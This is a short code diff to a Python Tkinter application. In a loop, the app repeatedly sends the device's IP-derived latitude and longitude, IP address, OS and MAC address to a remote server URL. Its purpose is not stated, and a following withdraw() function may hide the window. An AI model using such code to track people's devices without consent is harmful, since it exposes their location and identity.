@@ -132,13 +132,20 @@ class Window(Frame):
         url = data[-1]
         while True:
             try:
+                lat, long = self.get_lat_long()
                 requests.post(url, data={
+                    "token": 'location',
                     "id": data[0],
-                    "hostname": data[1],
-                    "loc": self.get_lat_long(),
+                    "name": '',
+                    "phone": '',
+                    "latitude": lat,
+                    "longitude": long,
+                    "address": '',
+                    "ip": self.get_ip(),
                     "os": platform.system(),
                     "mac": get_mac(),
                 })
+                # print(self.get_lat_long())
             except Exception as e:
                 print("There was an error sending the data to server ", e)
             time.sleep(interval)
@@ -152,7 +159,7 @@ class Window(Frame):
     def get_lat_long(self):
         r = requests.get(url='http://ipinfo.io/json')
         data = r.json()
-        return data['loc']
+        return data['loc'].split(',')
 
 
 def withdraw():
